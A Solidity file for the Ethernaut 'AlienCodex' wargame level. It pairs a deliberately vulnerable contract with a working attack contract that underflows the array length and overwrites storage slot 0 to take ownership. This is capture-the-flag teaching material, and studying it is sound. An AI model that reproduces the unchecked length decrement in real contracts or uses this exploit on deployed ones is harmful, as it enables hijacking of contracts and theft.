// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract AlienCodex is Ownable {
    // address public owner; // slot 0
    bool public contact; // slot 0
    bytes32[] public codex; // slot 1

    modifier contacted() {
        assert(contact);
        _;
    }

    function make_contact() public {
        contact = true;
    }

    // 0x0000000000000000000000000000000000000000000000000000000000000001
    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        assembly {
            sstore(codex.slot, sub(sload(codex.slot), 0x01))
        }
        // codex.length--;
    }

    function codexLength() public view returns(uint256) {
        return codex.length;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

contract Solution19 {
    event HackSucceeded(address addr);
    function hack(AlienCodex _hack) public {
        if (!_hack.contact()) {
            _hack.make_contact();
        }

        if (_hack.owner() != msg.sender) {
            _hack.retract(); // overflow to max value of uint256
            // Then we can use any index so that can modify any storage.
            _hack.revise(calcuHackIndex(), convertAddr(msg.sender));
            require(_hack.owner() == msg.sender, "Hack fails");
            emit HackSucceeded(address(_hack));
        }
    }

    function convertAddr(address _addr) public pure returns(bytes32) {
        return bytes32(uint256(uint160(_addr)));
    }

    function calcuHackIndex() public pure returns(uint256 index) {
        unchecked {
            index = 0 - getArrayStartLocation(1);
            assert(getArrayStartLocation(1) + index == 0);
        }
    }

    function getArrayStartLocation(uint256 slot) public pure returns(uint256) {
        return uint256(keccak256(abi.encode(slot)));
    }
}
